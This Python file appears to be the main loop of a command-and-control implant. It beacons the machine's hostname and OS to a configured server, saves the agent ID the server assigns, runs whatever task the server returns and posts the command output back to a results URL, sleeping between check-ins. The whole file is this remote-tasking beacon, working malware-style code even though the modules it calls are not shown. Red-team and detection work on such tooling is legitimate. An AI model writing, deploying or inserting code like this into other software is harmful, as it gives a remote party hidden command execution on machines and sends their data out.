import time
import socket
import platform
import config
import state
import comms
import tasking


def run_agent_loop():
    api_url, sleep_interval, results_url = config.load_config()

    while True:
        agent_id = state.get_agent_id()
        hostname = socket.gethostname()
        os_name = f"{platform.system()} {platform.release()}"

        payload = {"hostname": hostname, "os_name": os_name}

        if agent_id:
            payload["agentId"] = agent_id

        response_checkin = comms.perform_checkin(api_url, payload)

        if response_checkin:
            if "agentId" in response_checkin:
                new_agent_id = response_checkin["agentId"]
                state.save_agent_id(new_agent_id)

            if "task" in response_checkin:
                received_task = response_checkin["task"]
                if received_task and received_task != "no-task-for-now":
                    print("[INFO] Task received")
                    command_out = tasking.execute_task(received_task)
                    comms.send_results(results_url, agent_id, command_out)

        else:
            print(f"Check-in failed. Trying again in {sleep_interval}s.")

        time.sleep(sleep_interval)
